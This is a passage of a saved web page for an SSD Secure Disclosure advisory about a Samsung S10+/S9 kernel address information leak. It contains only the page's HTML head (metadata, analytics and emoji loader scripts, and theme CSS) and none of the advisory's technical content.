<!DOCTYPE html>
<!-- saved from url=(0141)https://ssd-disclosure.com/ssd-advisory-samsung-s10-s9-kernel-4-14-android-10-kernel-function-address-text-and-heap-address-information-leak/ -->
<html lang="en-US" class=" js csstransforms no-csstransforms3d csstransitions"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
              <meta name="theme-color" content="#3c9fb6">
            <link rel="profile" href="http://gmpg.org/xfn/11">
            <link rel="pingback" href="https://ssd-disclosure.com/xmlrpc.php">
      <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">

	<!-- This site is optimized with the Yoast SEO plugin v17.7 - https://yoast.com/wordpress/plugins/seo/ -->
	<title>SSD Advisory – Samsung S10+/S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak - SSD Secure Disclosure</title>
	<link rel="canonical" href="https://ssd-disclosure.com/ssd-advisory-samsung-s10-s9-kernel-4-14-android-10-kernel-function-address-text-and-heap-address-information-leak/">
	<meta property="og:locale" content="en_US">
	<meta property="og:type" content="article">
	<meta property="og:title" content="SSD Advisory – Samsung S10+/S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak - SSD Secure Disclosure">
	<meta property="og:description" content="Find out how a vulnerability discovered in Samsung S10+/S9 kernel allows leaking of sensitive function address information.">
	<meta property="og:url" content="https://ssd-disclosure.com/ssd-advisory-samsung-s10-s9-kernel-4-14-android-10-kernel-function-address-text-and-heap-address-information-leak/">
	<meta property="og:site_name" content="SSD Secure Disclosure">
	<meta property="article:publisher" content="https://www.facebook.com/ssdsecuredisclosure">
	<meta property="article:published_time" content="2021-08-24T09:11:01+00:00">
	<meta property="article:modified_time" content="2021-10-04T13:25:59+00:00">
	<meta name="twitter:card" content="summary_large_image">
	<meta name="twitter:creator" content="@securiteam_ssd">
	<meta name="twitter:site" content="@securiteam_ssd">
	<meta name="twitter:label1" content="Written by">
	<meta name="twitter:data1" content="SSD Disclosure / Technical Lead">
	<meta name="twitter:label2" content="Est. reading time">
	<meta name="twitter:data2" content="11 minutes">
	<script type="text/javascript" async="" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/analytics.js.下載"></script><script type="text/javascript" async="" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/bhw7ka8q"></script><script src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/sdk.js.下載" async="" crossorigin="anonymous"></script><script type="text/javascript" async="" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/recaptcha__zh_tw.js.下載" crossorigin="anonymous" integrity="sha384-hR3VRaqfxKhcqcNEbDZ8Pxj7CCkilFkn9ncTAW+JsyYR9gpOPsTcFdzSznYj1sSs"></script><script id="facebook-jssdk" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/sdk.js(1).下載"></script><script async="" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/gtm.js.下載"></script><script type="text/javascript" async="" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/ga.js.下載"></script><script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"https://ssd-disclosure.com/#organization","name":"SSD Secure Disclosure","url":"https://ssd-disclosure.com/","sameAs":["https://www.facebook.com/ssdsecuredisclosure","https://www.linkedin.com/company/ssd-disclosure/","https://www.youtube.com/channel/UC9ZnYbYqOe6Y3eRdw0TMz9Q?view_as=subscriber","https://twitter.com/securiteam_ssd"],"logo":{"@type":"ImageObject","@id":"https://ssd-disclosure.com/#logo","inLanguage":"en-US","url":"https://ssd-disclosure.com/wp-content/uploads/2020/01/ssd-black-transparent.png","contentUrl":"https://ssd-disclosure.com/wp-content/uploads/2020/01/ssd-black-transparent.png","width":579,"height":317,"caption":"SSD Secure Disclosure"},"image":{"@id":"https://ssd-disclosure.com/#logo"}},{"@type":"WebSite","@id":"https://ssd-disclosure.com/#website","url":"https://ssd-disclosure.com/","name":"SSD Secure Disclosure","description":"Turn your skills into a career.","publisher":{"@id":"https://ssd-disclosure.com/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://ssd-disclosure.com/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"WebPage","@id":"https://ssd-disclosure.com/ssd-advisory-samsung-s10-s9-kernel-4-14-android-10-kernel-function-address-text-and-heap-address-information-leak/#webpage","url":"https://ssd-disclosure.com/ssd-advisory-samsung-s10-s9-kernel-4-14-android-10-kernel-function-address-text-and-heap-address-information-leak/","name":"SSD Advisory \u2013 Samsung S10+/S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak - SSD Secure Disclosure","isPartOf":{"@id":"https://ssd-disclosure.com/#website"},"datePublished":"2021-08-24T09:11:01+00:00","dateModified":"2021-10-04T13:25:59+00:00","breadcrumb":{"@id":"https://ssd-disclosure.com/ssd-advisory-samsung-s10-s9-kernel-4-14-android-10-kernel-function-address-text-and-heap-address-information-leak/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://ssd-disclosure.com/ssd-advisory-samsung-s10-s9-kernel-4-14-android-10-kernel-function-address-text-and-heap-address-information-leak/"]}]},{"@type":"BreadcrumbList","@id":"https://ssd-disclosure.com/ssd-advisory-samsung-s10-s9-kernel-4-14-android-10-kernel-function-address-text-and-heap-address-information-leak/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://ssd-disclosure.com/"},{"@type":"ListItem","position":2,"name":"SSD Advisory \u2013 Samsung S10+/S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak"}]},{"@type":"Article","@id":"https://ssd-disclosure.com/ssd-advisory-samsung-s10-s9-kernel-4-14-android-10-kernel-function-address-text-and-heap-address-information-leak/#article","isPartOf":{"@id":"https://ssd-disclosure.com/ssd-advisory-samsung-s10-s9-kernel-4-14-android-10-kernel-function-address-text-and-heap-address-information-leak/#webpage"},"author":{"@id":"https://ssd-disclosure.com/#/schema/person/20b43a1c569b5f4bd7972dd7b8047bc7"},"headline":"SSD Advisory \u2013 Samsung S10+/S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak","datePublished":"2021-08-24T09:11:01+00:00","dateModified":"2021-10-04T13:25:59+00:00","mainEntityOfPage":{"@id":"https://ssd-disclosure.com/ssd-advisory-samsung-s10-s9-kernel-4-14-android-10-kernel-function-address-text-and-heap-address-information-leak/#webpage"},"wordCount":1606,"publisher":{"@id":"https://ssd-disclosure.com/#organization"},"inLanguage":"en-US"},{"@type":"Person","@id":"https://ssd-disclosure.com/#/schema/person/20b43a1c569b5f4bd7972dd7b8047bc7","name":"SSD Disclosure / Technical Lead","image":{"@type":"ImageObject","@id":"https://ssd-disclosure.com/#personlogo","inLanguage":"en-US","url":"https://secure.gravatar.com/avatar/b17afed54a4f7c3675f6b67d5cbb026b?s=96&d=mm&r=g","contentUrl":"https://secure.gravatar.com/avatar/b17afed54a4f7c3675f6b67d5cbb026b?s=96&d=mm&r=g","caption":"SSD Disclosure / Technical Lead"},"url":"https://ssd-disclosure.com/author/noamr/"}]}</script>
	<!-- / Yoast SEO plugin. -->


<link rel="dns-prefetch" href="https://www.google.com/">
<link rel="dns-prefetch" href="https://fonts.googleapis.com/">
<link rel="dns-prefetch" href="https://s.w.org/">
<link rel="alternate" type="application/rss+xml" title="SSD Secure Disclosure » Feed" href="https://ssd-disclosure.com/feed/">
<link rel="alternate" type="application/rss+xml" title="SSD Secure Disclosure » Comments Feed" href="https://ssd-disclosure.com/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="SSD Secure Disclosure » SSD Advisory – Samsung S10+/S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak Comments Feed" href="https://ssd-disclosure.com/ssd-advisory-samsung-s10-s9-kernel-4-14-android-10-kernel-function-address-text-and-heap-address-information-leak/feed/">
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/ssd-disclosure.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.8.2"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([10084,65039,8205,55357,56613],[10084,65039,8203,55357,56613])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script><script src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/wp-emoji-release.min.js.下載" type="text/javascript" defer=""></script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel="stylesheet" id="pt-cv-public-style-css" href="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/cv.css" type="text/css" media="all">
<link rel="stylesheet" id="bootstrap-css" href="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/bootstrap.min.css" type="text/css" media="all">
<link rel="stylesheet" id="parent-style-css" href="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/style.css" type="text/css" media="all">
<link rel="stylesheet" id="child-style-css" href="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/style(1).css" type="text/css" media="all">
<link rel="stylesheet" id="wp-block-library-css" href="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/style.min.css" type="text/css" media="all">
<link rel="stylesheet" id="contact-form-7-css" href="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/styles.css" type="text/css" media="all">
<link rel="stylesheet" id="sod-floatbar-style-css" href="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/style(2).css" type="text/css" media="all">
<link rel="stylesheet" id="kd_addon_style-css" href="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/kd_vc_front.css" type="text/css" media="all">
<link rel="stylesheet" id="rs-plugin-settings-css" href="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/rs6.css" type="text/css" media="all">
<style id="rs-plugin-settings-inline-css" type="text/css">
#rs-demo-id {}
</style>
<link rel="stylesheet" id="SFSImainCss-css" href="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/sfsi-style.css" type="text/css" media="all">
<link rel="stylesheet" id="wpflowpluscss-css" href="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/screen.css" type="text/css" media="all">
<style id="wpflowpluscss-inline-css" type="text/css">

.wpif2-angled .wpif2_images {
	perspective: 1600px;
	transition: transform .5s, visibility .3s, width 0s;
	transform-origin: center left;
	ms-transform-origin: center left;	
}
.wpif2-angled .wpif2-left {
    transform: translate3d(0,0,0) rotateY( 45deg );
	ms-transform: translate3d(0,0,0) rotateY( 45deg );
}
.wpif2-angled .wpif2-right {
    transform: translate3d(0,0,0) rotateY( -45deg );
	ms-transform: translate3d(0,0,0) rotateY( -45deg );
}

.wpif2-topline .wpif2_image_block {
	top: 10px !important;
}

.wpif2-flip .wpif2_images, .wpif2-explode .wpif2_images {
	perspective: 1600px;
	transition: transform .5s, visibility .3s, width 0s;
	transform-origin: center left;
	ms-transform-origin: center left;	
}
.wpif2-flip .wpif2_image_block,
.wpif2-explode .wpif2_image_block {
	transform: rotateX(90deg);
	ms-transform: rotateX(90deg);
}	
.wpif2-flip .wpif2_image_block.wpif2-centered,
.wpif2-explode .wpif2_image_block.wpif2-centered {
	transform: translate3d(0,0,0) rotateX(0) rotateY(0);
	ms-transform: translate3d(0,0,0) rotateX(0) rotateY(0);
	transition: transform .5s, visibility .3s, opacity .3s, width 0s;
	display:none;
	opacity: 1;
}
.wpif2-flip .wpif2_image_block.wpif2-centered {
	transform-origin: center left;	
	ms-transform-origin: center left;	
}
.wpif2-flip .wpif2_image_block.wpif2-left {
	transform: translate3d(0,0,0) rotateX(-90deg);
	ms-transform: translate3d(0,0,0) rotateX(-90deg);
	transition: 0s;
	transform-origin: center left;	
	ms-transform-origin: center left;	
}
.wpif2-explode .wpif2_image_block.wpif2-left {
	transform: translate3d(0,400px,0) scale3d(4,4,4);
	ms-transform: translate3d(0,400px,0) scale3d(4,4,4);
	transition: 0s;
	opacity: 0;
}
.wpif2-explode .wpif2_image_block.wpif2-left .wpif2_reflection {
	display: none;
}
.wpif2-flip .wpif2_image_block.wpif2-right .wpif2_reflection,
.wpif2-explode .wpif2_image_block.wpif2-right .wpif2_reflection {
	opacity: 0;
}
.wpif2-flip .wpif2_image_block.wpif2-right,
.wpif2-explode .wpif2_image_block.wpif2-right {
	transform-origin: center left;
	ms-transform-origin: center left;
	transform: translate3d(0,0,0) rotateX( -90deg );
	ms-transform: translate3d(0,0,0) rotateX( -90deg );
	transition: transform .5s, visibility .3s, width 0s;
}

.wpif2-slideup-caption {
    position: absolute;
    background: black;
    background: rgba(0,0,0,0.75);
    color: #ccc;
    opacity: 0;
    -webkit-transition: all 0.6s ease;
    -moz-transition:    all 0.6s ease;
    -o-transition:      all 0.6s ease;
    width: 100%;
	left: 0; 
	bottom: 0;
	text-align: center;
	padding: 10px 0;
	line-height: normal;
}

.wpif2-centered .wpif2-slideup-caption { 
	bottom: 49.9%;
	opacity: 1;
}
		
.wpif2_image_block .wpif2-slideup-caption h4 {
    font-size: 14px;
    text-transform: none;
	margin: 0;
	padding: 0;
	color: #ccc;
}
.wpif2_image_block .wpif2-slideup-caption p {
    font-size: 12px;
	margin: 8px 0 0 0;
	padding: 0;
	color: #ccc;
}

</style>
<!--[if IE 8]>
<link rel='stylesheet' id='wpflowplus-ie8-css'  href='https://ssd-disclosure.com/wp-content/plugins/wp-imageflow2/css/ie8.css?ver=5.8.2' type='text/css' media='all' />
<![endif]-->
<link rel="stylesheet" id="keydesign-style-css" href="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/style(1).css" type="text/css" media="all">
<style id="keydesign-style-inline-css" type="text/css">
header #kd-slider { padding-top: 110px;}
.key-icon-box .service-heading { font-size: 22px; }
.key-icon-box p { font-size: 20px; }

div.wpcf7 { 
background-color: #1f1f1f;
padding:20px;
}
.wpcf7 input[type="text"],
.wpcf7 input[type="email"],
.wpcf7 textarea {
background:#000000;
color:#000000;
font-family:Open Sans, sans-serif; 
font-style:italic;    
}
.wpcf7 input[type="submit"],
.wpcf7 input[type="button"] { 
background-color:#3C9FB6 ;
width:100%;
text-align:center;
text-transform:uppercase;
}
.wpcf7 label {
  color: #F0FFFF;
  font-size: 10px; 
}

.blog-content strong {
    line-height: 2.8;
}

.blog-content p {
    line-height: 1.8;
}

.blog-content li {
    font-size: 18px !important;
    line-height: 2;
}
</style>
<link rel="stylesheet" id="font-awesome-css" href="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/font-awesome.min.css" type="text/css" media="all">
<link rel="stylesheet" id="js_composer_front-css" href="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/js_composer.min.css" type="text/css" media="all">
<link rel="stylesheet" id="photoswipe-css" href="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/photoswipe.css" type="text/css" media="all">
<link rel="stylesheet" id="photoswipe-skin-css" href="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/photoswipe-default-skin.css" type="text/css" media="all">
<link rel="stylesheet" id="enlighterjs-css" href="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/enlighterjs.min.css" type="text/css" media="all">
<link rel="stylesheet" id="redux-google-fonts-css" href="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/css" type="text/css" media="all">
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/jquery.min.js.下載" id="jquery-core-js"></script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/jquery-migrate.min.js.下載" id="jquery-migrate-js"></script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/jquery.easing.min.js.下載" id="kd_easing_script-js"></script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/owl.carousel.min.js.下載" id="kd_carousel_script-js"></script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/jquery.easytabs.min.js.下載" id="kd_easytabs_script-js"></script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/jquery.appear.js.下載" id="kd_jquery_appear-js"></script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/kd_addon_script.js.下載" id="kd_addon_script-js"></script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/revolution.tools.min.js.下載" id="tp-tools-js"></script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/rs6.min.js.下載" id="revmin-js"></script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/photoswipe.min.js.下載" id="photoswipejs-js"></script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/photoswipe-ui-default.min.js.下載" id="photoswipejs-ui-js"></script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/wpflowplus.js.下載" id="wpif2_wpflowplus-js"></script>
<link rel="https://api.w.org/" href="https://ssd-disclosure.com/wp-json/"><link rel="alternate" type="application/json" href="https://ssd-disclosure.com/wp-json/wp/v2/posts/4928"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://ssd-disclosure.com/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://ssd-disclosure.com/wp-includes/wlwmanifest.xml"> 
<link rel="shortlink" href="https://ssd-disclosure.com/?p=4928">
<link rel="alternate" type="application/json+oembed" href="https://ssd-disclosure.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fssd-disclosure.com%2Fssd-advisory-samsung-s10-s9-kernel-4-14-android-10-kernel-function-address-text-and-heap-address-information-leak%2F">
<link rel="alternate" type="text/xml+oembed" href="https://ssd-disclosure.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fssd-disclosure.com%2Fssd-advisory-samsung-s10-s9-kernel-4-14-android-10-kernel-function-address-text-and-heap-address-information-leak%2F&amp;format=xml">
   <script type="text/javascript">
   var _gaq = _gaq || [];
   _gaq.push(['_setAccount', 'UA-138882328-1']);
   _gaq.push(['_trackPageview']);
   (function() {
   var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
   ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
   var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
   })();
   </script>
<meta name="follow.it-verification-code-dzh5eFRIdGRSV1N0SXZ5QmpBa0VnV21ZZTNpbElPdFp2US9ldXF4ekdPeU1yVjZvOE5PNlArc2RZVjhScllqcUlkSTh0MjZuODM0bDRoUmJXdW16MzJMbHppd3lXSUJxT3d6TzdqQjJDQnlEeU1ZcUc0cWtpNnRhempJcEt2M2Z8Uy9tSFBnTk1OQTBMZGdGWHZiZEIxUnFTNkhodmR6YnNaVFVtRWdFQzZYVT0=" content="SXGZLVqDfaT9zZ75vbbb">		<script>
			document.documentElement.className = document.documentElement.className.replace( 'no-js', 'js' );
		</script>
				<style>
			.no-js img.lazyload { display: none; }
			figure.wp-block-image img.lazyloading { min-width: 150px; }
							.lazyload, .lazyloading { opacity: 0; }
				.lazyloaded {
					opacity: 1;
					transition: opacity 400ms;
					transition-delay: 0ms;
				}
					</style>
		<style type="text/css">.tt_button:hover .iconita,
.tt_button.second-style .iconita,
#single-page #comments input[type="submit"]:hover,
.tt_button.tt_secondary_button,
.tt_button.tt_secondary_button .iconita,
.es-accordion .es-time,
.wpb-js-composer .vc_tta-container .vc_tta-color-white.vc_tta-style-modern .vc_tta-tab.vc_active a,
.team-member.design-two:hover .team-socials .fa:hover,
.team-member.design-two .team-socials .fa:hover,
.team-member.design-two .team-content .team-link .fa:hover,
.vc_toggle_title:hover h4,
.socials-widget a:hover .fa,
.socials-widget a:hover,
.lower-footer .pull-left a:hover,
.pricing-table .tt_button,
.kd-photobox:hover .phb-content h4,
.pricing-table.active .tt_button:hover,
.vc_grid-item-mini .vc_gitem-zone .vc_btn3.vc_btn3-style-custom,
.woocommerce .star-rating span,
.navbar-default.navbar-shrink .nav li.active a,
.es-accordion .es-heading h4 a:hover,
.keydesign-cart ul.product_list_widget .cart-item:hover,
.woocommerce .keydesign-cart ul.product_list_widget .cart-item:hover,
.key-reviews:hover .rw-author-details p,
#customizer .options a:hover i,
.woocommerce .price_slider_wrapper .price_slider_amount .button,
#customizer .options a:hover,
#single-page input[type="submit"]:hover,
#posts-content .post input[type="submit"]:hover,
.active .pricing-option .fa,
.woocommerce div.product .woocommerce-tabs ul.tabs li a:hover,
#comments .reply a:hover,
.meta-content .tags a:hover,
.navigation.pagination .next,
.woocommerce-cart  #single-page table.cart .product-name a:hover,
.navigation.pagination .prev,
.navbar-default .nav li a:hover,
#posts-content .entry-meta a:hover,
#posts-content .post .blog-single-title:hover,
.search-results .blog-single-title a:hover,
.woocommerce span.onsale,
.product_meta a:hover,
.tags a:hover, .tagcloud a:hover,
.tt_button.second-style,
.large-counter .kd_counter_units,
.lower-footer .pull-right a:hover,
.key-reviews:hover .rw-author-details h4,
.woocommerce-review-link:hover,
.navbar.navbar-default a:hover,
.rw_rating .rw-title,
.upper-footer .modal-menu-item,
.video-socials a:hover .fa,
.kd_pie_chart .pc-link a:hover,
.navbar-default.navbar-shrink .modal-menu-item:hover,
.navbar-default.navbar-shrink .nav li a:hover,
.navbar-default.navbar-shrink .nav li a:focus,
.vc_grid-item-mini .vc_gitem_row .vc_gitem-col h4:hover,
.navbar-default.navbar-shrink .nav li a:hover,
.navbar-default.navbar-shrink .nav li a:focus,
.fa,
.wpcf7 .wpcf7-submit:hover,
.contact .wpcf7-response-output,
.video-bg .secondary-button:hover,
#headerbg li a.active,
#headerbg li a.active:hover,
.footer-nav a:hover ,
.wpb_wrapper .menu a:hover ,
.text-danger,
.blog_widget ul li a:before,
.pricing .fa,
.searchform #searchsubmit:hover,
.woocommerce-product-search button:hover::before,
code,
#single-page .single-page-content ul li:before,
.blog_widget ul li a:hover,
.features-tabs .tab.active h5,
.subscribe-form header .wpcf7-submit,
#posts-content .page-content ul li:before,
.chart-content .nc-icon-outline,
.chart,
.row .vc_custom_heading a:hover,
.features-tabs .tab a:hover,
.secondary-button-inverse,
.primary-button.button-inverse:hover,
.primary-button,
a,
.page-404 .section-heading,
.navbar-default .navbar-nav > .active > a,
.pss-link a:hover,
.woocommerce-cart #single-page .cart_totals table td,
.kd_number_string,
.featured_content_parent .active-elem h4,
.contact-map-container .toggle-map:hover .fa,
.contact-map-container .toggle-map:hover,
.tt_button:hover,
.nc-icon-outline,
#posts-content .blog-content ul li:before,
#posts-content .page-content ul li:before,
.woocommerce ul.products li.product h3:hover,
.woocommerce ul.products li.product h2:hover,
.wpb_text_column ol>li:before,
.wpb_text_column ul>li:before,
.key-icon-box .ib-link a:hover,
.kd-photobox .phb-btncontainer a:hover {
			color: #3c9fb6;
	}

.parallax.with-overlay:after,
.tt_button.tt_secondary_button:hover,
.modal-menu-item:hover,
.pricing-table .tt_button:hover,
.modal-content-inner .wpcf7-not-valid-tip,
.wpb-js-composer .vc_tta-container .vc_tta.vc_tta-style-classic .vc_tta-tabs-container .vc_tta-tabs-list li.vc_active a,
.tt_button.second-style:hover,
.pricing-table.active .tt_button,
#customizer .screenshot a,
.heading-separator,
.section .wpcf7-not-valid-tip,
.port-prev.tt_button:hover,
.port-next.tt_button:hover,
.row .vc_toggle_default .vc_toggle_icon,
.row .vc_toggle_default .vc_toggle_icon::after,
.row .vc_toggle_default .vc_toggle_icon::before,
.woocommerce ul.products li.product .added_to_cart,
.woocommerce #respond input#submit,
.woocommerce a.button,
.woocommerce input.button:hover,
.woocommerce nav.woocommerce-pagination ul li a:hover,
.upper-footer .modal-menu-item:hover,
.kd-process-steps .pss-step-number span,
.contact-map-container .toggle-map,
.kd-photobox .phb-content .phb-btncontainer a,
.portfolio-item .portfolio-content,
.keydesign-cart .badge,
.wpcf7 .wpcf7-submit,
.post-password-form input[type="submit"],
.tt_button,
.owl-controls .owl-page span,
.woocommerce a.remove:hover,
.team-content-hover,
.pricing .secondary-button.secondary-button-inverse:hover,
.with-overlay .parallax-overlay,
.secondary-button.secondary-button-inverse:hover,
.secondary-button,
.primary-button.button-inverse,
#posts-content .post input[type="submit"],
.btn-xl,
.with-overlay,
.vc_grid-item-mini .vc_gitem-zone .vc_btn3.vc_btn3-style-custom:hover,
.woocommerce .price_slider_wrapper .ui-slider-horizontal .ui-slider-range,
.separator,
.cb-container.cb_main_color:hover,
.keydesign-cart .buttons .btn:hover,
.woocommerce .keydesign-cart .buttons .btn:hover,
.woocommerce ul.products li.product .button:hover,
#posts-content #comments input[type="submit"]:hover,
.contact-map-container .toggle-map:hover,
.wpcf7 .wpcf7-submit:hover,
.woocommerce button.button:hover,
.testimonials.slider .owl-controls span,
.navigation.pagination .next:hover,
.spinner:before,
.navigation.pagination .prev:hover,
.section .wpcf7-mail-sent-ok {
			background-color: #3c9fb6;
	}

::selection {
			background-color: #3c9fb6;
	}

::-moz-selection {
			background-color: #3c9fb6;
	}

#single-page #comments input[type="submit"]:hover,
#posts-content #comments input[type="submit"]:hover,
.navigation.pagination .next,
.navigation.pagination .prev,
.port-prev.tt_button,
.port-next.tt_button,
.upper-footer .modal-menu-item,
.wpcf7 .wpcf7-submit:hover,
.tt_button,
#commentform #submit,
.navigation.pagination .next, .navigation.pagination .prev,
.modal-menu-item:focus, .modal-menu-item,
.woocommerce ul.products li.product .button:hover,
.woocommerce .price_slider_wrapper .ui-slider .ui-slider-handle,
